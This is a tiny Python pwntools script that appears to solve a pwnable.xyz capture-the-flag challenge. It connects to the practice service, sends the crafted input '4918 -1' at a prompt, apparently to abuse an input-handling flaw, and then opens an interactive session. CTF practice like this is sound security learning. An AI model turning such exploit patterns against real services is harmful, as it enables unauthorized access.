from pwn import *

p=remote("svc.pwnable.xyz",30001)

context.log_level='debug'

p.sendlineafter("input: ", "4918 -1")

p.interactive()
p.close()